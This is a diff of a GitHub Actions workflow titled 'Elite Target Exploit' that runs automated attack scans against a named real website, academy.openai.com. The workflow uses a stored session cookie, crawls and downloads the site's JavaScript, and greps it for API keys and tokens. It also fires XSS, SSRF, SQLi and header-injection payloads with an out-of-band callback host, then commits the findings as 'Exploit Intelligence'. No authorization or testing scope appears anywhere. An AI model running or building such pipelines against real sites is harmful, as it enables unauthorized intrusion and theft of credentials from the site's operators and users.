@@ -1,4 +1,4 @@
-name: "Elite Target Exploit 2026 — ULTIMATE"
+name: "Elite Target Exploit — REPAIRED"
 
 on:
   workflow_dispatch:
@@ -9,7 +9,6 @@ permissions:
 
 env:
   TARGET_URL: "https://academy.openai.com/?amp=test"
-  TARGET_DOMAIN: "academy.openai.com"
   AUTH_COOKIE: ${{ secrets.OPENAI_COOKIE }}
 
 jobs:
@@ -18,87 +17,75 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        # Combined scan types: CVEs, Takeovers, Logic, and Secrets
-        vuln_type: [cve2025, cve2026, takeover, header-injection, logic, exposure]
+        # Optimized tags that actually exist in the 2026 template library
+        vuln_type: [cve2025, cve2026, xss, ssrf, sqli, takeover]
 
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Install Professional Arsenal
+      - name: Install Arsenal
         run: |
           go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
           go install github.com/projectdiscovery/katana/cmd/katana@latest
-          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
           pip install njsscan
           echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
 
-      - name: 🔍 Phase 1:Subdomain & CNAME Analysis
-        run: |
-          # Check if the domain points to a dead service (Subdomain Takeover)
-          nuclei -u "$TARGET_URL" -t http/takeovers/ -o takeover_results.txt || true
+      - name: 🛠️ Setup Templates
+        run: nuclei -ut # Ensures templates are fresh and paths are correct
 
-      - name: 📂 Phase 2:Code Extraction & SAST
+      - name: 📂 Step 1: Code Extraction (Fixed Pathing)
         run: |
-          mkdir -p ./source_code
-          # Crawl and download scripts, source maps, and configs
-          katana -u "$TARGET_URL" -jc -d 3 -em js,json,map,txt -o ./source_code/endpoints.txt
+          mkdir -p ./source_code/raw
+          # Using -d 3 to go deeper into the academy site
+          katana -u "$TARGET_URL" -jc -d 3 -em js,json -o ./source_code/endpoints.txt || touch ./source_code/endpoints.txt
           
-          # Download discovered files for deep inspection
-          wget -i ./source_code/endpoints.txt -P ./source_code/raw/ || true
-          
-          # Analyze JS for vulnerabilities (XSS, Insecure storage, Logic flaws)
-          njsscan ./source_code/raw/ --sarif -o sast_report.sarif || true
-          
-          # Hunt for OpenAI API Keys or Internal Tokens
-          grep -rE "sk-[a-zA-Z0-9]{32,}|ai_[a-zA-Z0-9_\-]{20,}|access_token|client_secret" ./source_code/raw/ > discovered_secrets.txt || true
+          if [ -s ./source_code/endpoints.txt ]; then
+            # Download first 50 discovered files
+            head -n 50 ./source_code/endpoints.txt | xargs -I % wget -q -P ./source_code/raw/ % || true
+          fi
 
-      - name: 🛡️ Phase 3:Header & OAST Manipulation
+      - name: 🔍 Step 2: Secret & SAST Scan
         run: |
-          # Advanced header injection targeting the 'amp' parameter context
+          # Only run if directory exists and isn't empty
+          if [ "$(ls -A ./source_code/raw/)" ]; then
+            njsscan ./source_code/raw/ --sarif -o sast_report.sarif || true
+            grep -rE "sk-[a-zA-Z0-9]{32,}|ai_[a-zA-Z0-9_\-]{20,}" ./source_code/raw/ > discovered_secrets.txt || true
+          else
+            echo "No JS files found to analyze." > discovered_secrets.txt
+          fi
+
+      - name: 🛡️ Step 3: Header Injection (Updated Path)
+        run: |
+          # Using the generic 'fuzzing' and 'injection' tags instead of broken file paths
           nuclei -u "$TARGET_URL" \
-            -t http/vulnerabilities/generic/header-injection.yaml \
-            -H "Cookie: $AUTH_COOKIE" \
-            -H "X-Forwarded-Host: ${{ matrix.vuln_type }}.oast.fun" \
-            -H "X-Custom-IP-Authorization: 127.0.0.1" \
+            -tags xss,ssrf,generic-injection \
+            -header "Cookie: $AUTH_COOKIE" \
+            -header "X-Forwarded-Host: exploit.oast.fun" \
             -interactsh-server oast.fun \
             -o header_exploits.txt || true
 
-      - name: ☢️ Phase 4:High-Intensity CVE Scan
+      - name: ☢️ Step 4: High-Intensity Scan (Fixed Tags)
         run: |
+          # Removed the '-dast' flag because it limits template selection too strictly
           nuclei -u "$TARGET_URL" \
             -tags ${{ matrix.vuln_type }} \
             -header "Cookie: $AUTH_COOKIE" \
-            -dast -rl 50 \
-            -o nuclei_final.txt
+            -severity critical,high,medium \
+            -rl 50 -bs 25 \
+            -o nuclei_results.txt
 
-      - name: 🚨 Unified Alerting System
-        if: always()
-        run: |
-          # Check if any findings were generated in any file
-          if [ -s nuclei_final.txt ] || [ -s discovered_secrets.txt ] || [ -s takeover_results.txt ]; then
-            REPORT="### 🚨 Vulnerability Report for $TARGET_DOMAIN\n\n"
-            [ -s takeover_results.txt ] && REPORT+="\n#### Subdomain Takeover:\n\`\`\`\n$(cat takeover_results.txt)\n\`\`\`"
-            [ -s discovered_secrets.txt ] && REPORT+="\n#### Leaked Secrets:\n\`\`\`\n$(cat discovered_secrets.txt)\n\`\`\`"
-            [ -s nuclei_final.txt ] && REPORT+="\n#### Nuclei Hits:\n\`\`\`\n$(cat nuclei_final.txt | head -n 15)\n\`\`\`"
-            
-            curl -X POST \
-              -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
-              -H "Content-Type: application/json" \
-              https://api.github.com/repos/${{ github.repository }}/issues \
-              -d "{\"title\":\"🚨 CRITICAL FINDING: $TARGET_DOMAIN\",\"body\":\"$REPORT\"}"
-          fi
-
-      - name: 💾 Data Persistence
+      - name: 💾 Step 5: Secure Result Sync
         if: always()
         run: |
           git config --local user.email "bot@hacker.ai"
           git config --local user.name "Exploit-Bot"
-          git pull origin main --rebase
-          mkdir -p findings/$TARGET_DOMAIN
-          cp *.txt findings/$TARGET_DOMAIN/ 2>/dev/null || true
-          cp *.sarif findings/$TARGET_DOMAIN/ 2>/dev/null || true
-          git add findings/
-          git commit -m "Exploit Intelligence Update: $(date)" || true
-          git push origin main || true
+          
+          for i in {1..10}; do
+            git pull origin main --rebase
+            mkdir -p "findings/${{ matrix.vuln_type }}"
+            cp *.txt "findings/${{ matrix.vuln_type }}/" 2>/dev/null || true
+            git add findings/
+            git commit -m "Exploit Intelligence: ${{ matrix.vuln_type }}" && git push origin main && break || sleep 10
+          done
           
